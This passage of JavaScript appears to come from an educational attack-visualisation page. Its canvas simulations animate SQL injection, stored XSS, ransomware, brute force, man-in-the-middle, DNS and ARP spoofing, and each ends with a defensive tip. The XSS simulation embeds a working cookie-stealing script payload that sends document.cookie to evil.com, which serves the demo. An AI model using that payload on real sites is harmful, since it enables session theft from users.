            ctx.fillStyle='#39ff14'; ctx.font='9px monospace';
            ctx.fillText('AUTH BYPASSED',boxX+8,103);
        }

        if(frame>100){
            const ty=130;
            ctx.fillStyle='rgba(0,240,255,0.05)'; ctx.strokeStyle='rgba(0,240,255,0.15)'; ctx.lineWidth=1;
            ctx.beginPath(); ctx.roundRect(boxX,ty,boxW,25+Math.min(extractedRows.length,5)*22,6); ctx.fill(); ctx.stroke();
            ctx.fillStyle='#00f0ff'; ctx.font='bold 10px monospace'; ctx.textAlign='left';
            ctx.fillText('DATABASE DUMP — users table',boxX+10,ty+16);
            extractedRows.slice(-5).forEach((row,i)=>{
                ctx.fillStyle=i%2===0?'rgba(255,59,59,0.1)':'transparent'; ctx.fillRect(boxX,ty+20+i*22,boxW,22);
                ctx.fillStyle='#e8ecf4'; ctx.font='9px monospace';
                ctx.fillText(row,boxX+10,ty+33+i*22);
            });
            if(frame%40===0&&extractedRows.length<records.length){
                extractedRows.push(records[extractedRows.length]);
                termLog(`> Record extracted: ${records[extractedRows.length-1].split('|')[0].trim()}`,'error');
                if(extractedRows.length===1)activateStep(3);
                if(extractedRows.length===records.length)activateStep(4);
            }
        }

        if(frame%15===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=Math.min(500,frame*2);
            if(e1)e1.textContent=Math.min(150,frame);
            if(e2)e2.textContent=(extractedRows.length*10000).toLocaleString();
            if(e3)e3.textContent=Math.min(24,extractedRows.length*5);
            setProgress(Math.min(100,(frame/300)*100));
        }
        if(frame>=300){setProgress(100);termLog('> Full DB extracted. Use parameterized queries!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateXSS = function() {
    termLog('> Injecting malicious script into comment field...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    const scriptCode = '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>';
    let frame=0, victimsHit=0;
    const floatingCookies=[];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Script stored in database — persistent XSS.','error');},800);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Victim browses page — script executes in browser.','error');},1600);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);

        const bW=Math.min(560,w-20), bX=(w-bW)/2, bY=10;
        ctx.fillStyle='rgba(20,25,40,0.95)'; ctx.strokeStyle='rgba(139,92,246,0.25)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(bX,bY,bW,h-20,8); ctx.fill(); ctx.stroke();

        ctx.fillStyle='rgba(139,92,246,0.1)'; ctx.fillRect(bX,bY,bW,28);
        ctx.fillStyle='#8892a8'; ctx.font='10px monospace'; ctx.textAlign='left';
        ctx.fillText('https://vulnerable-forum.com/post/42',bX+10,bY+17);

        const cY=bY+42;
        ctx.fillStyle='rgba(255,255,255,0.03)'; ctx.strokeStyle='rgba(139,92,246,0.2)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(bX+10,cY,bW-20,45,4); ctx.fill(); ctx.stroke();
        ctx.fillStyle='#525c70'; ctx.font='9px monospace'; ctx.fillText('Add a comment:',bX+16,cY-5);

        const revealed=scriptCode.slice(0,Math.min(scriptCode.length,Math.floor(frame/2)));
        ctx.fillStyle='#ff3b3b'; ctx.font='10px monospace';
        ctx.fillText(revealed,bX+14,cY+20);

        if(frame>60){
            ctx.fillStyle='rgba(255,59,59,0.08)'; ctx.beginPath(); ctx.roundRect(bX+10,cY,bW-20,45,4); ctx.fill();
            ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace';
            ctx.fillText('MALICIOUS SCRIPT STORED IN DATABASE',bX+14,cY+38);
        }

        if(frame>100){
            const vY=cY+60;
            ctx.fillStyle='#8892a8'; ctx.font='10px monospace';
            ctx.fillText('Active Sessions (Script running in their browsers):',bX+10,vY);
            for(let i=0;i<Math.min(victimsHit,8);i++){
                const row=Math.floor(i/4),col=i%4;
                const vx=bX+10+col*((bW-20)/4), vy=vY+12+row*28;
                ctx.fillStyle='rgba(139,92,246,0.12)'; ctx.strokeStyle='rgba(139,92,246,0.35)'; ctx.lineWidth=1;
                ctx.beginPath(); ctx.roundRect(vx,vy,(bW-28)/4,20,3); ctx.fill(); ctx.stroke();
                ctx.fillStyle='#8b5cf6'; ctx.font='8px monospace'; ctx.textAlign='left';
                ctx.fillText(`user_${i+1}`,vx+5,vy+13);
            }
            if(frame%35===0&&victimsHit<20){
                victimsHit++;
                floatingCookies.push({x:bX+rnd(60,bW-60),y:vY+55,vy:-1.5,alpha:1});
                activateStep(3);
                termLog(`> Session cookie exfiltrated from user_${victimsHit}`,'error');
            }
        }

        floatingCookies.forEach(c=>{
            c.y+=c.vy; c.alpha-=0.01;
            ctx.globalAlpha=Math.max(0,c.alpha);
            ctx.fillStyle='#8b5cf6'; ctx.font='10px monospace'; ctx.textAlign='center';
            ctx.fillText('cookie=>evil.com',c.x,c.y);
            ctx.globalAlpha=1;
        });

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=Math.min(5, Math.floor(frame/70) + 1);
            if(e1)e1.textContent=victimsHit;
            if(e2)e2.textContent=victimsHit;
            if(e3)e3.textContent=victimsHit;
            setProgress(Math.min(100,(frame/350)*100));
        }
        if(frame===250){activateStep(4);termLog('> Accounts compromised via stolen sessions!','error');}
        if(frame>=350){setProgress(100);termLog('> Simulation done. Implement CSP headers!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateRansomware = function() {
    termLog('> Malware initializing... contacting C2 server.', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    const files=['documents/tax_return.pdf','documents/contracts.docx','photos/family.jpg','database/customers.sql','projects/main.py','projects/config.env','finance/payroll.xlsx','backups/server.tar','keys/rsa_private.pem','reports/annual.pdf','desktop/passwords.txt','videos/presentation.mp4'];
    let frame=0, encryptedCount=0;
    const fileStates=files.map(f=>({name:f,encrypted:false,progress:0}));

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> C2 response: AES-256 key received.','error');},700);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Scanning filesystem — 48,000 files found.','warning');},1400);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(3);termLog('> Encryption started. AES-256 + RSA-2048.','error');},2100);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.98)'; ctx.fillRect(0,0,w,h);
        ctx.fillStyle='#ff3b3b'; ctx.font='bold 13px monospace'; ctx.textAlign='center';
        ctx.fillText('RANSOMWARE — ENCRYPTING YOUR FILES',w/2,24);

        const cols=Math.ceil(Math.sqrt(files.length)), bW=(w-30)/cols, bH=22;
        fileStates.forEach((file,idx)=>{
            const col=idx%cols, row=Math.floor(idx/cols);
            const fx=15+col*bW, fy=40+row*(bH+4);
            if(frame>60+idx*20&&!file.encrypted){
                file.progress=Math.min(1,file.progress+0.03);
                if(file.progress>=1){file.encrypted=true;encryptedCount++;if(encryptedCount===1)termLog(`> Encrypted: ${file.name}`,'error');}
            }
            ctx.fillStyle=file.encrypted?'rgba(255,59,59,0.12)':file.progress>0?'rgba(255,170,0,0.08)':'rgba(255,255,255,0.02)';
            ctx.strokeStyle=file.encrypted?'rgba(255,59,59,0.3)':'rgba(255,255,255,0.05)';
            ctx.lineWidth=1; ctx.beginPath(); ctx.roundRect(fx,fy,bW-3,bH,3); ctx.fill(); ctx.stroke();
            if(file.progress>0&&!file.encrypted){ctx.fillStyle='rgba(255,170,0,0.3)';ctx.beginPath();ctx.roundRect(fx,fy,(bW-3)*file.progress,bH,3);ctx.fill();}
            const icon=file.encrypted?'🔒':file.progress>0?'⚙':'📄';
            ctx.fillStyle=file.encrypted?'#ff3b3b':file.progress>0?'#ffaa00':'#8892a8';
            ctx.font='8px monospace'; ctx.textAlign='left';
            ctx.fillText(`${icon} ${file.name.split('/').pop()}`,fx+4,fy+15);
        });

        if(encryptedCount>=files.length-1){
            const noteY=40+Math.ceil(files.length/cols)*(bH+4)+8;
            if(noteY<h-80){
                ctx.fillStyle='rgba(255,59,59,0.1)'; ctx.strokeStyle='rgba(255,59,59,0.4)'; ctx.lineWidth=2;
                ctx.beginPath(); ctx.roundRect(10,noteY,w-20,70,6); ctx.fill(); ctx.stroke();
                ctx.fillStyle='#ff3b3b'; ctx.font='bold 12px monospace'; ctx.textAlign='center';
                ctx.fillText('YOUR FILES HAVE BEEN ENCRYPTED',w/2,noteY+18);
                ctx.fillStyle='#e8ecf4'; ctx.font='10px monospace';
                ctx.fillText('Send 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf...',w/2,noteY+36);
                ctx.fillStyle='#ffaa00'; ctx.fillText('YOU HAVE 72 HOURS TO PAY THE RANSOM',w/2,noteY+54);
                activateStep(4);
            }
        }

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=(encryptedCount*4000).toLocaleString();
            if(e1)e1.textContent=`${(encryptedCount*0.6).toFixed(1)} GB`;
            if(e2)e2.textContent=`$${(encryptedCount*1200).toLocaleString()}`;
            if(e3)e3.textContent=`${Math.round(frame/60)}s`;
            setProgress(Math.min(100,(frame/400)*100));
        }
        if(frame>=400){setProgress(100);termLog('> Simulation done. Maintain offline backups!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateBruteForce = function() {
    termLog('> Loading dictionary: rockyou.txt (14M passwords)', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    const passwords=['password','123456','admin','letmein','qwerty','welcome','monkey','dragon','1234567890','iloveyou','sunshine','master','football','shadow','pass@123','abc123','superman','111111','princess','michael'];
    let frame=0, attempts=0, cracked=0;
    const SPEED=2000;

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Dictionary loaded. Starting automated attack.','warning');},600);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Hydra firing at SSH port 22 @ 2000 req/s...','error');},1200);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        attempts+=60;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        const boxW=Math.min(580,w-20), boxX=(w-boxW)/2;
        ctx.fillStyle='rgba(255,170,0,0.05)'; ctx.strokeStyle='rgba(255,170,0,0.2)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(boxX,12,boxW,36,6); ctx.fill(); ctx.stroke();
        ctx.fillStyle='#8892a8'; ctx.font='10px monospace'; ctx.textAlign='left';
        ctx.fillText('TARGET: ssh root@192.168.1.1:22  |  Tool: Hydra v9.4',boxX+12,34);

        for(let i=0;i<10;i++){
            const pwdIdx=(Math.floor(attempts/60)+i*7)%passwords.length;
            const pwd=passwords[pwdIdx];
            const ay=58+i*22;
            const found=(frame>200&&i===5&&cracked===1)||(frame>280&&i===3&&cracked===2);
            ctx.fillStyle=found?'rgba(57,255,20,0.15)':'rgba(255,255,255,0.02)'; ctx.fillRect(boxX,ay,boxW,20);
            ctx.fillStyle=found?'#39ff14':'#525c70'; ctx.font='10px monospace'; ctx.textAlign='left';
            ctx.fillText(`[${String(attempts+i*7).padStart(8,'0')}] root:${pwd}`,boxX+8,ay+13);
            ctx.fillStyle=found?'#39ff14':'#ff3b3b'; ctx.textAlign='right';
            ctx.fillText(found?'SUCCESS':'FAILED',boxX+boxW-8,ay+13);
            ctx.textAlign='left';
        }

        if(frame===200&&cracked===0){cracked++;activateStep(3);termLog('> PASSWORD FOUND: root:password123 — SSH access!','success');}
        if(frame===280&&cracked===1){cracked++;termLog('> PASSWORD FOUND: admin:admin — Admin panel!','success');}
        if(frame===320){activateStep(4);termLog('> Unauthorized SSH session established!','error');}

        const meterY=h-55, meterW=Math.min(400,w-40), meterX=(w-meterW)/2;
        const fillPct=Math.min(1,0.7+Math.sin(frame*0.1)*0.1);
        ctx.fillStyle='rgba(255,170,0,0.1)'; ctx.strokeStyle='rgba(255,170,0,0.3)'; ctx.lineWidth=1;
        ctx.beginPath(); ctx.roundRect(meterX,meterY,meterW,16,4); ctx.fill(); ctx.stroke();
        const grad=ctx.createLinearGradient(meterX,0,meterX+meterW,0);
        grad.addColorStop(0,'#39ff14'); grad.addColorStop(0.6,'#ffaa00'); grad.addColorStop(1,'#ff3b3b');
        ctx.fillStyle=grad; ctx.beginPath(); ctx.roundRect(meterX,meterY,meterW*fillPct,16,4); ctx.fill();
        ctx.fillStyle='#fff'; ctx.font='bold 10px monospace'; ctx.textAlign='center';
        ctx.fillText(`${Math.round(SPEED*fillPct)} req/s`,w/2,meterY+12);

        if(frame%15===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=Math.min(1000000,attempts).toLocaleString();
            if(e1)e1.textContent=Math.round(SPEED*fillPct).toLocaleString();
            if(e2)e2.textContent=Math.max(0,attempts-cracked).toLocaleString();
            if(e3)e3.textContent=cracked;
            setProgress(Math.min(100,(frame/380)*100));
        }
        if(frame>=380){setProgress(100);termLog('> Simulation done. Use MFA + account lockout!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateMitM = function() {
    termLog('> Initiating ARP spoofing on local network...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    const victim={x:w*0.15,y:h/2,icon:'💻',label:'VICTIM'};
    const gateway={x:w*0.85,y:h/2,icon:'🌐',label:'GATEWAY'};
    const attacker={x:w/2,y:h*0.18,icon:'😈',label:'ATTACKER'};

    let frame=0, intercepted=0;
    const packets=[];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Attacker positioned between victim and gateway.','warning');},800);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Intercepting HTTP traffic — plaintext visible!','error');},1600);

    function drawNode(node,color,glow){
        if(glow){ctx.shadowBlur=20;ctx.shadowColor=color;}
        ctx.beginPath(); ctx.arc(node.x,node.y,26,0,Math.PI*2);
        ctx.fillStyle=`${color}20`; ctx.fill();
        ctx.strokeStyle=color; ctx.lineWidth=2; ctx.stroke();
        ctx.shadowBlur=0;
        ctx.fillStyle=color; ctx.font='18px Arial'; ctx.textAlign='center'; ctx.textBaseline='middle';
        ctx.fillText(node.icon,node.x,node.y-4);
        ctx.font='bold 9px monospace'; ctx.textBaseline='top';
        ctx.fillText(node.label,node.x,node.y+30);
    }

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        const mitm=frame>50;
        if(mitm){
            [[victim,attacker],[attacker,gateway]].forEach(([a,b])=>{
                ctx.beginPath(); ctx.setLineDash([6,4]); ctx.moveTo(a.x,a.y); ctx.lineTo(b.x,b.y);
                ctx.strokeStyle='rgba(255,59,59,0.55)'; ctx.lineWidth=1.5; ctx.stroke(); ctx.setLineDash([]);
            });
        }else{
            ctx.beginPath(); ctx.moveTo(victim.x,victim.y); ctx.lineTo(gateway.x,gateway.y);
            ctx.strokeStyle='rgba(59,130,246,0.35)'; ctx.lineWidth=1; ctx.stroke();
        }

        drawNode(victim,'#3b82f6',false);
        drawNode(gateway,'#39ff14',false);
        drawNode(attacker,'#ff3b3b',mitm);

        if(frame%25===0&&mitm){
            const isRet=Math.random()>0.5;
            packets.push({from:isRet?gateway:victim,to:attacker,p:0,data:['GET /login HTTP/1.1','POST /bank/transfer','Authorization: Bearer xyz'][rndInt(0,3)]});
        }

        packets.forEach(pkt=>{
            pkt.p+=0.025;
            const px=pkt.from.x+(pkt.to.x-pkt.from.x)*pkt.p, py=pkt.from.y+(pkt.to.y-pkt.from.y)*pkt.p;
            ctx.beginPath(); ctx.arc(px,py,5,0,Math.PI*2);
            ctx.fillStyle=`rgba(255,59,59,${1-pkt.p*0.5})`; ctx.fill();
            if(pkt.p>=1){intercepted++;activateStep(3);termLog(`> Intercepted: ${pkt.data}`,'error');}
        });
        packets.splice(0,packets.filter(p=>p.p>=1).length);

        if(frame>80){
            const py=h*0.6;
            ctx.fillStyle='rgba(255,59,59,0.05)'; ctx.strokeStyle='rgba(255,59,59,0.15)'; ctx.lineWidth=1;
            ctx.beginPath(); ctx.roundRect(w/2-150,py,300,95,6); ctx.fill(); ctx.stroke();
            ctx.fillStyle='#ff3b3b'; ctx.font='bold 9px monospace'; ctx.textAlign='center';
            ctx.fillText('CAPTURED CREDENTIALS',w/2,py+14);
            ['username=alice&password=hunter2','Authorization: Basic YWxpY2U6aHVudGVyMg==','Cookie: session=eyJhbGciOi...'].slice(0,Math.min(3,Math.floor(frame/80))).forEach((d,i)=>{
                ctx.fillStyle='#8892a8'; ctx.font='8px monospace'; ctx.fillText(d,w/2,py+30+i*18);
            });
        }

        if(frame===240){activateStep(4);termLog('> SSL stripping: HTTPS downgraded to HTTP!','error');}

        if(frame%15===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=(intercepted*1000).toLocaleString();
            if(e1)e1.textContent=Math.floor(intercepted/8);
            if(e2)e2.textContent=`${(intercepted*0.05).toFixed(1)} MB`;
            if(e3)e3.textContent=Math.floor(intercepted/12);
            setProgress(Math.min(100,(frame/350)*100));
        }
        if(frame>=350){setProgress(100);termLog('> Simulation done. Always use HTTPS + VPN!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateZeroDay = function() {
    termLog('> Zero-day CVE detected — no patch available.', 'error');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, exploited=0, systemsAtRisk=0;
    const cols=Math.ceil(Math.sqrt(120)), bW=(w-40)/cols, bH=18;
    const memBlocks=[];
    for(let i=0;i<120;i++){
        memBlocks.push({x:20+(i%cols)*bW,y:40+Math.floor(i/cols)*(bH+3),w:bW-2,h:bH,state:'safe',label:`0x${(i*64).toString(16).padStart(4,'0').toUpperCase()}`,timer:rndInt(60,240)});
    }

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Exploit payload crafted — targeting heap overflow.','error');},700);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> Watering hole deployed. 2M systems exposed.','warning');},1500);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);
        ctx.fillStyle='#ff00aa'; ctx.font='bold 11px monospace'; ctx.textAlign='center';
        ctx.fillText('MEMORY MAP — HEAP OVERFLOW EXPLOIT',w/2,22);

        memBlocks.forEach(block=>{
            if(frame>block.timer&&block.state==='safe'){block.state='corrupted';exploited++;}
            if(block.state==='corrupted'&&frame>block.timer+30)block.state='pwned';
            const color=block.state==='safe'?'rgba(57,255,20,0.6)':block.state==='corrupted'?'rgba(255,170,0,0.8)':'rgba(255,0,170,0.9)';
            ctx.fillStyle=block.state==='safe'?'rgba(57,255,20,0.04)':block.state==='corrupted'?'rgba(255,170,0,0.12)':'rgba(255,0,170,0.18)';
            ctx.strokeStyle=color; ctx.lineWidth=1;
            ctx.beginPath(); ctx.roundRect(block.x,block.y,block.w,block.h,2); ctx.fill(); ctx.stroke();
            ctx.fillStyle=color; ctx.font='7px monospace'; ctx.textAlign='left';
            ctx.fillText(block.label,block.x+2,block.y+11);
            if(block.state==='pwned'){ctx.fillStyle='#ff00aa'; ctx.fillText('PWN',block.x+block.w-25,block.y+11);}
        });

        systemsAtRisk=Math.min(2000000,frame*3000);
        if(frame===150){activateStep(3);termLog('> System compromised — root shell obtained!','error');}
        if(frame===240){activateStep(4);termLog('> Backdoor installed — persistent access established.','error');}

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent='9.8 / 10';
            if(e1)e1.textContent=systemsAtRisk.toLocaleString();
            if(e2)e2.textContent=frame > 200 ? '1 (emergency)' : '0';
            if(e3)e3.textContent=`${Math.max(10, 200 - Math.round(frame/2))} days avg`;
            setProgress(Math.min(100,(frame/320)*100));
        }
        if(frame>=320){setProgress(100);termLog('> Simulation done. Patch immediately!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateDNSSpoofing = function() {
    termLog('> Targeting DNS resolver — cache poisoning attack...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, forgedPkts=0, poisoned=0, redirected=0;
    const packets=[], domains=['bank.com','paypal.com','mail.google.com','corp-vpn.com','login.microsoft.com'], poisonedDomains=[];

    const resolver={x:w/2,y:h/2,label:'DNS RESOLVER'};
    const victimN={x:w*0.1,y:h/2,label:'VICTIM'};
    const realSvr={x:w*0.9,y:h*0.3,label:'REAL SERVER'};
    const fakeSvr={x:w*0.9,y:h*0.7,label:'EVIL SERVER'};
    const attackerN={x:w*0.45,y:h*0.1,label:'ATTACKER'};

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Flooding resolver with forged DNS responses.','error');},700);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> DNS cache POISONED — traffic redirecting!','error');},1400);

    function node(n,color){
        ctx.beginPath(); ctx.arc(n.x,n.y,20,0,Math.PI*2);
        ctx.fillStyle=`${color}18`; ctx.fill(); ctx.strokeStyle=color; ctx.lineWidth=2; ctx.stroke();
        ctx.fillStyle=color; ctx.font='8px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
        ctx.fillText(n.label,n.x,n.y+22);
    }

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        [[victimN,resolver,'#3b82f630'],[resolver,realSvr,'#39ff1430'],[resolver,fakeSvr,frame>80?'#ff3b3b55':'#ff3b3b11'],[attackerN,resolver,'#ff3b3b35']].forEach(([a,b,c])=>{
            ctx.beginPath(); ctx.moveTo(a.x,a.y); ctx.lineTo(b.x,b.y); ctx.strokeStyle=c; ctx.lineWidth=1; ctx.stroke();
        });

        node(resolver,'#39ff14'); node(victimN,'#3b82f6'); node(realSvr,'#39ff14'); node(fakeSvr,'#ff3b3b'); node(attackerN,'#ff3b3b');

        if(frame%8===0&&frame<300){packets.push({x:attackerN.x,y:attackerN.y,tx:resolver.x,ty:resolver.y,p:0,evil:true});forgedPkts++;}
        if(frame>120&&frame%50===0){poisoned++;poisonedDomains.push(domains[rndInt(0,domains.length)]);packets.push({x:victimN.x,y:victimN.y,tx:resolver.x,ty:resolver.y,p:0,evil:false});activateStep(3);}
        if(frame>200&&frame%70===0){redirected++;activateStep(4);termLog(`> ${poisonedDomains[rndInt(0,poisonedDomains.length)]} → EVIL SERVER!`,'error');}

        packets.forEach(pkt=>{
            pkt.p+=0.04;
            const px=pkt.x+(pkt.tx-pkt.x)*pkt.p, py=pkt.y+(pkt.ty-pkt.y)*pkt.p;
            ctx.beginPath(); ctx.arc(px,py,pkt.evil?4:5,0,Math.PI*2);
            ctx.fillStyle=`rgba(255,59,59,${(1-pkt.p)*0.9})`; ctx.fill();
        });
        packets.splice(0,packets.filter(p=>p.p>=1).length);

        if(poisonedDomains.length>0){
            const cy=h*0.62;
            ctx.fillStyle='rgba(57,255,20,0.04)'; ctx.strokeStyle='rgba(57,255,20,0.15)'; ctx.lineWidth=1;
            ctx.beginPath(); ctx.roundRect(w/2-130,cy,260,14+poisonedDomains.length*14,4); ctx.fill(); ctx.stroke();
            ctx.fillStyle='#39ff14'; ctx.font='bold 8px monospace'; ctx.textAlign='center';
            ctx.fillText('POISONED CACHE',w/2,cy+10);
            poisonedDomains.slice(-4).forEach((d,i)=>{
                ctx.fillStyle='#ff3b3b'; ctx.font='8px monospace'; ctx.fillText(`${d} → 10.0.0.66 EVIL`,w/2,cy+22+i*14);
            });
        }

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=forgedPkts.toLocaleString();
            if(e1)e1.textContent=poisoned;
            if(e2)e2.textContent=(redirected*15000).toLocaleString();
            if(e3)e3.textContent=`${Math.max(0, 300 - frame)}s`;
            setProgress(Math.min(100,(frame/350)*100));
        }
        if(frame>=350){setProgress(100);termLog('> Simulation done. Enable DNSSEC!','success');stopSimulation();return;}
        state.simFrame=requestAnimationFrame(draw);
    }
    state.simFrame=requestAnimationFrame(draw);
};

window.simulateARPPoison = function() {
    termLog('> Scanning LAN for ARP table targets...', 'warning');
    const { canvas, ctx, w, h } = getCanvas();
    activateStep(0);

    let frame=0, arpSent=0, poisoned=0;
    const arpPackets=[];
    const hosts=[
        {x:w*0.1,y:h*0.3,label:'Host A\n192.168.1.10',color:'#3b82f6'},
        {x:w*0.1,y:h*0.7,label:'Host B\n192.168.1.20',color:'#39ff14'},
        {x:w*0.5,y:h*0.5,label:'GATEWAY\n192.168.1.1',color:'#8b5cf6'},
        {x:w*0.9,y:h*0.5,label:'ATTACKER\n192.168.1.99',color:'#ff3b3b',evil:true},
    ];

    simTimeout(()=>{if(!state.simRunning)return;activateStep(1);termLog('> Gratuitous ARP flood initiated...','error');},700);
    simTimeout(()=>{if(!state.simRunning)return;activateStep(2);termLog('> ARP cache updated on victim hosts!','error');},1500);

    function draw(){
        if(!state.simRunning)return;
        frame++;
        ctx.clearRect(0,0,w,h);
        ctx.fillStyle='rgba(6,10,19,0.97)'; ctx.fillRect(0,0,w,h);

        hosts.slice(0,3).forEach((ha,ii)=>{
            hosts.slice(0,3).filter(hb=>hb!==ha).forEach(hb=>{
                ctx.beginPath(); ctx.moveTo(ha.x,ha.y); ctx.lineTo(hb.x,hb.y);
                ctx.strokeStyle='rgba(255,255,255,0.04)'; ctx.lineWidth=1; ctx.stroke();
            });
        });

        if(frame>40){
            [hosts[0],hosts[1]].forEach(v=>{
                ctx.beginPath(); ctx.setLineDash([5,5]); ctx.moveTo(hosts[3].x,hosts[3].y); ctx.lineTo(v.x,v.y);
                ctx.strokeStyle='rgba(255,59,59,0.45)'; ctx.lineWidth=1.5; ctx.stroke(); ctx.setLineDash([]);
            });
        }

        hosts.forEach(host=>{
            ctx.shadowBlur=host.evil?18:0; ctx.shadowColor=host.color;
            ctx.beginPath(); ctx.arc(host.x,host.y,22,0,Math.PI*2);
            ctx.fillStyle=`${host.color}18`; ctx.fill();
            ctx.strokeStyle=host.color; ctx.lineWidth=2; ctx.stroke(); ctx.shadowBlur=0;
            ctx.fillStyle=host.color; ctx.font='8px monospace'; ctx.textAlign='center'; ctx.textBaseline='top';
            host.label.split('\n').forEach((l,i)=>ctx.fillText(l,host.x,host.y+24+i*11));
        });

        if(frame%15===0&&frame<300){
            const target=frame%30===0?hosts[0]:hosts[1];
            arpPackets.push({x:hosts[3].x,y:hosts[3].y,tx:target.x,ty:target.y,p:0});
            arpSent++;
        }

        arpPackets.forEach(pkt=>{
            pkt.p+=0.03;
            const px=pkt.x+(pkt.tx-pkt.x)*pkt.p, py=pkt.y+(pkt.ty-pkt.y)*pkt.p;
            ctx.beginPath(); ctx.arc(px,py,4,0,Math.PI*2);
            ctx.fillStyle=`rgba(255,59,59,${1-pkt.p})`; ctx.fill();
            ctx.fillStyle=`rgba(255,59,59,${1-pkt.p*0.8})`;
            ctx.font='7px monospace'; ctx.textAlign='center'; ctx.fillText('ARP',px,py-7);
            if(pkt.p>=1)poisoned++;
        });
        arpPackets.splice(0,arpPackets.filter(p=>p.p>=1).length);

        if(frame>100){
            [0,1].forEach(idx=>{
                const ty=h*0.53+idx*60;
                ctx.fillStyle='rgba(255,59,59,0.05)'; ctx.strokeStyle='rgba(255,59,59,0.2)'; ctx.lineWidth=1;
                ctx.beginPath(); ctx.roundRect(w*0.19,ty,185,48,4); ctx.fill(); ctx.stroke();
                ctx.fillStyle='#ff3b3b'; ctx.font='bold 8px monospace'; ctx.textAlign='left';
                ctx.fillText(`HOST ${idx===0?'A':'B'} ARP CACHE (POISONED):`,w*0.19+6,ty+12);
                ctx.fillStyle='#8892a8'; ctx.font='8px monospace';
                ctx.fillText('192.168.1.1 → DE:AD:BE:EF (ATTACKER)',w*0.19+6,ty+26);
                ctx.fillStyle='#ff3b3b'; ctx.fillText('COMPROMISED!',w*0.19+6,ty+40);
            });
        }

        if(frame===200){activateStep(3);termLog('> All victim traffic now routes via attacker!','error');}
        if(frame===280){activateStep(4);termLog('> Packets modified and replayed to gateway.','error');}

        if(frame%20===0){
            const e0=$('live-stat-0'),e1=$('live-stat-1'),e2=$('live-stat-2'),e3=$('live-stat-3');
            if(e0)e0.textContent=arpSent.toLocaleString();
            if(e1)e1.textContent=Math.min(5,Math.floor(arpSent/10));
            if(e2)e2.textContent=`${(poisoned*2.4).toFixed(1)} KB`;
            if(e3)e3.textContent=`${Math.round(frame/60)}s`;
            setProgress(Math.min(100,(frame/340)*100));
        }
